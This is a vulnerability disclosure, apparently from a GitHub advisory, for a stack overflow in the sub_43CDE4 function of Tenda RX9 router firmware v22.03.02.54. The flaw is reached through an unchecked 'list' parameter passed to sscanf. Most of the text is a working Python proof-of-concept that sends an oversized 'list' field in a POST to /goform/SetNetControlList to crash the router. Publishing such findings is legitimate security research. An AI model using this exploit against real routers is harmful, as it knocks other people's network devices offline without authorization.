# Tenda router sub_43CDE4 function stack overflow vulnerability

> vendor:Tenda
>
> product:RX9
>
> version:v1.0 v22.03.02.54
>
> type:Stack Overflow

## Vulnerability Description

Tenda RX9 v1.0 v22.03.02.54 were discovered to contain a stack overflow via the list parameter in the sub_43CDE4 function.

## Vulnerability Details

In the function, after V3 obtains the variable named "list", it is directly passed to the dangerous function sscanf without processing. This can be achieved by modifying the parameter length of the variable list in the post request, which may cause a stack buffer overflow. Denial of Service Purpose.

![image](https://github.com/cvdyfbwa/IoT-Tenda-Router/assets/150313831/9cd47d45-20fb-4cd1-a822-c339a400e0f5)


## POC

    import socket
    import os
    from pwn import *

    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

    ip = '192.168.244.130'
    port = 80

    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    li('[+] connecting')
    r.connect((ip, port))
    li('[+] connect finish')

    rn = b'\r\n'

    p1 = b'A' * 0x500

    p2 = b'list=' + p1

    p3 = b"POST /goform/SetNetControlList" + b" HTTP/1.1" + rn
    p3 += b"Host: 192.168.244.130" + rn
    p3 += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" + rn
    p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
    p3 += b"Accept-Language: gzip, deflate" + rn
    p3 += b"Accept-Encoding: zh-CN,zh;q=0.9" + rn
    p3 += b"Cookie: password=cjq1qw" + rn
    p3 += b"Connection: close" + rn
    p3 += b"Upgrade-Insecure-Requests: 1" + rn
    p3 += (b"Content-Length: %d" % len(p2)) +rn
    p3 += b'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'+rn
    p3 += rn
    p3 += p2

    li('[+] sending payload')
    r.send(p3)

    response = r.recv(4096)
    response = response.decode()
    li(response)


   
